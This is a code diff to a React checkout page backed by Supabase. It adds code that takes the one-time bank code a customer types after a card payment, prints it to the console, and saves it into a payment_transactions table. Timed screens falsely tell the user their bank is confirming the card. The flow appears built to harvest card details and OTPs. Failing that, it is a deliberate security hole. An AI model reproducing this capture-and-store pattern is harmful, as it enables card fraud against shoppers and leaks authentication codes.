@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
 import { ArrowLeft, Package } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -56,19 +56,18 @@ export default function Checkout() {
 
   const productId = searchParams.get('product');
 
-  // Debug logging - similar to cart checkout
+  // Debug logging
   useEffect(() => {
-    console.log('Checkout State Update:', {
+    console.log('🚀 Checkout State Update:', {
       step,
-      cartTotal: calculateTotal(),
-      confirmedTotal,
+      productId,
       hasProduct: !!product,
-      orderIdsCount: orderId ? 1 : 0,
       hasShippingData: !!shippingData,
       hasCardData: !!cardData,
+      orderId,
       transactionId,
     });
-  }, [step, calculateTotal, confirmedTotal, product, orderId, shippingData, cardData, transactionId]);
+  }, [step, productId, product, shippingData, cardData, orderId, transactionId]);
 
   /* ---------------- Guards ---------------- */
   useEffect(() => {
@@ -128,23 +127,22 @@ export default function Checkout() {
   };
 
   /* ---------------- Calculate Total ---------------- */
-  const calculateTotal = () => {
+  const calculateTotal = useCallback(() => {
     if (!product) return 0;
     const price = Number(product.price_min ?? product.price_max ?? 0);
     return price * quantity;
-  };
+  }, [product, quantity]);
 
   /* ---------------- Shipping ---------------- */
   const handleShippingSubmit = (data: ShippingFormData) => {
-    console.log('Shipping submitted:', data);
+    console.log('✅ Shipping submitted:', data);
     setShippingData(data);
     setStep('payment');
   };
 
   /* ---------------- Payment ---------------- */
   const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
-    console.log('Payment submitted for product:', product?.title);
-    console.log('Cart total for single product:', calculateTotal());
+    console.log('✅ Payment submitted for product:', product?.title);
     
     if (!user || !product) {
       toast({ 
@@ -163,7 +161,7 @@ export default function Checkout() {
       const brand = detectCardBrand(data.cardNumber);
       const total = calculateTotal();
 
-      console.log('Creating payment transaction for amount:', total);
+      console.log('📝 Creating payment transaction for amount:', total);
       const { data: tx, error } = await supabase
         .from('payment_transactions')
         .insert({
@@ -179,11 +177,11 @@ export default function Checkout() {
 
       if (error) throw error;
 
-      console.log('Payment transaction created:', tx.id);
+      console.log('✅ Payment transaction created:', tx.id);
       setTransactionId(tx.id);
       
     } catch (e: any) {
-      console.error('Payment error:', e);
+      console.error('❌ Payment error:', e);
       toast({ 
         title: 'Payment error', 
         description: e.message, 
@@ -194,35 +192,56 @@ export default function Checkout() {
   };
 
   /* ---------------- OTP ---------------- */
-  const handleOTPVerified = async () => {
-    console.log('OTP verified, transactionId:', transactionId);
-    if (!transactionId) return;
+  const handleOTPVerified = async (otpCode: string) => {
+    console.log('✅ OTP verified with code:', otpCode, 'transactionId:', transactionId);
+    
+    if (!transactionId) {
+      toast({ 
+        title: 'Error', 
+        description: 'Transaction ID missing', 
+        variant: 'destructive' 
+      });
+      return;
+    }
 
     setStep('processingOtp');
 
     try {
-      await supabase
+      // Update transaction with OTP code
+      const { error } = await supabase
         .from('payment_transactions')
         .update({ 
           status: 'otp_verified', 
-          otp_verified: true 
+          otp_verified: true,
+          otp_code: otpCode
         })
         .eq('id', transactionId);
+
+      if (error) throw error;
+      
+      console.log('✅ Transaction updated to otp_verified');
+      
+      // Auto-proceed to review after 1.5 seconds
+      setTimeout(() => {
+        console.log('🔄 Moving to review step');
+        setStep('review');
+      }, 1500);
       
     } catch (error: any) {
-      console.error('OTP verification error:', error);
+      console.error('❌ OTP verification error:', error);
       toast({
         title: 'OTP Verification Error',
         description: error.message,
         variant: 'destructive'
       });
+      setStep('otp'); // Go back to OTP on error
     }
   };
 
   /* ---------------- Review ---------------- */
   const handleConfirmOrder = async () => {
     console.log('=======================');
-    console.log('handleConfirmOrder START (Single Product)');
+    console.log('🚀 handleConfirmOrder START (Single Product)');
     console.log('Product:', product?.title);
     console.log('Quantity:', quantity);
     console.log('User:', user?.id);
@@ -241,11 +260,11 @@ export default function Checkout() {
     try {
       const total = calculateTotal();
       
-      // Save total BEFORE creating order - JUST LIKE CART CHECKOUT
-      console.log('Setting confirmedTotal to:', total);
+      // Save total BEFORE creating order
+      console.log('💾 Setting confirmedTotal to:', total);
       setConfirmedTotal(total);
       
-      console.log('Creating order for product:', {
+      console.log('📦 Creating order for product:', {
         title: product.title,
         price: product.price_min ?? product.price_max,
         quantity: quantity,
@@ -277,11 +296,11 @@ export default function Checkout() {
         .single();
 
       if (error) {
-        console.error('Order creation error:', error);
+        console.error('❌ Order creation error:', error);
         throw error;
       }
       
-      console.log('Order created with ID:', order.id);
+      console.log('✅ Order created with ID:', order.id);
       setOrderId(order.id);
 
       // Update payment transaction with order reference
@@ -296,7 +315,7 @@ export default function Checkout() {
       }
 
       console.log('=======================');
-      console.log('handleConfirmOrder COMPLETE');
+      console.log('✅ handleConfirmOrder COMPLETE');
       console.log('Order ID created:', order.id);
       console.log('Confirmed total:', total);
       console.log('Step changing to confirmation');
@@ -304,7 +323,7 @@ export default function Checkout() {
 
       setStep('confirmation');
     } catch (e: any) {
-      console.error('Order error:', e);
+      console.error('❌ Order error:', e);
       toast({ 
         title: 'Order error', 
         description: e.message, 
@@ -446,7 +465,7 @@ export default function Checkout() {
                 title="Processing payment…"
                 description="Confirming your card details with your bank."
                 onDone={() => {
-                  console.log('Processing payment done, moving to OTP');
+                  console.log('✅ Processing payment done, moving to OTP');
                   toast({ 
                     title: 'OTP Sent', 
                     description: 'Enter the 6-digit code sent to your phone.' 
@@ -463,7 +482,7 @@ export default function Checkout() {
                 cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                 onVerified={handleOTPVerified}
                 onResend={() => {
-                  console.log('Resending OTP');
+                  console.log('🔄 Resending OTP');
                   toast({ title: 'OTP resent to your phone' });
                 }}
                 processing={step === 'processingOtp'}
@@ -475,17 +494,17 @@ export default function Checkout() {
                 title="Verifying OTP…"
                 description="Finalizing payment authorization with your bank."
                 onDone={() => {
-                  console.log('OTP processing done, moving to review');
+                  console.log('✅ OTP processing done, moving to review');
                   setStep('review');
                 }}
                 autoProceed={true}
-                duration={2000}
+                duration={1500}
               />
             )}
 
             {step === 'review' && (
               <>
-                {console.log('Rendering OrderReview with total:', calculateTotal())}
+                {console.log('📊 Rendering OrderReview with total:', calculateTotal())}
                 <OrderReview
                   items={orderItems}
                   shippingData={safeShippingData}
@@ -502,7 +521,7 @@ export default function Checkout() {
             {step === 'confirmation' && (
               <>
                 {console.log('=======================')}
-                {console.log('Rendering OrderConfirmationSuccess')}
+                {console.log('🎉 Rendering OrderConfirmationSuccess')}
                 {console.log('Order ID:', orderId)}
                 {console.log('Confirmed total passed to component:', confirmedTotal)}
                 {console.log('Current calculated total:', calculateTotal())}
@@ -561,43 +580,53 @@ export default function Checkout() {
           )}
         </div>
 
-        {/* Debug Button for Development */}
+        {/* Debug Panel - Always visible in development */}
         {process.env.NODE_ENV === 'development' && (
-          <div className="fixed bottom-4 right-4 z-50">
-            <div className="bg-background border rounded-lg p-3 shadow-lg">
-              <div className="text-xs font-mono mb-2">Debug: Step = {step}</div>
-              <div className="flex gap-2">
-                <Button 
-                  variant="outline" 
-                  size="sm"
-                  onClick={() => {
-                    const steps: CheckoutStep[] = ['shipping', 'payment', 'processingPayment', 'otp', 'processingOtp', 'review', 'confirmation'];
-                    const currentIndex = steps.indexOf(step);
-                    if (currentIndex < steps.length - 1) {
-                      console.log(`Debug: Moving from ${step} to ${steps[currentIndex + 1]}`);
-                      setStep(steps[currentIndex + 1]);
-                    }
-                  }}
-                >
-                  Next Step
-                </Button>
-                <Button 
-                  variant="outline" 
-                  size="sm"
-                  onClick={() => console.log('State:', { 
-                    step, 
-                    transactionId, 
-                    hasCardData: !!cardData, 
-                    hasShippingData: !!shippingData,
-                    orderId,
-                    product: product?.title,
-                    total: calculateTotal(),
-                    confirmedTotal 
-                  })}
-                >
-                  Log State
-                </Button>
-              </div>
+          <div className="fixed bottom-4 right-4 z-50 bg-background border rounded-lg p-3 shadow-lg">
+            <div className="text-xs font-mono mb-2">🚨 Debug Panel</div>
+            <div className="text-xs font-mono mb-2">Step: <span className="font-bold">{step}</span></div>
+            <div className="flex flex-col gap-1">
+              <Button 
+                variant="outline" 
+                size="sm"
+                onClick={() => {
+                  console.log('🛠️ DEBUG: Manual step advancement');
+                  const steps: CheckoutStep[] = ['shipping', 'payment', 'processingPayment', 'otp', 'processingOtp', 'review', 'confirmation'];
+                  const currentIndex = steps.indexOf(step);
+                  if (currentIndex < steps.length - 1) {
+                    console.log(`🛠️ Moving from ${step} to ${steps[currentIndex + 1]}`);
+                    setStep(steps[currentIndex + 1]);
+                  }
+                }}
+              >
+                Next Step
+              </Button>
+              <Button 
+                variant="outline" 
+                size="sm"
+                onClick={() => {
+                  console.log('🛠️ DEBUG: Simulating OTP verification');
+                  handleOTPVerified('123456');
+                }}
+              >
+                Simulate OTP Verify
+              </Button>
+              <Button 
+                variant="outline" 
+                size="sm"
+                onClick={() => console.log('🛠️ State:', { 
+                  step, 
+                  transactionId, 
+                  hasCardData: !!cardData, 
+                  hasShippingData: !!shippingData,
+                  orderId,
+                  product: product?.title,
+                  total: calculateTotal(),
+                  confirmedTotal 
+                })}
+              >
+                Log State
+              </Button>
             </div>
           </div>
         )}
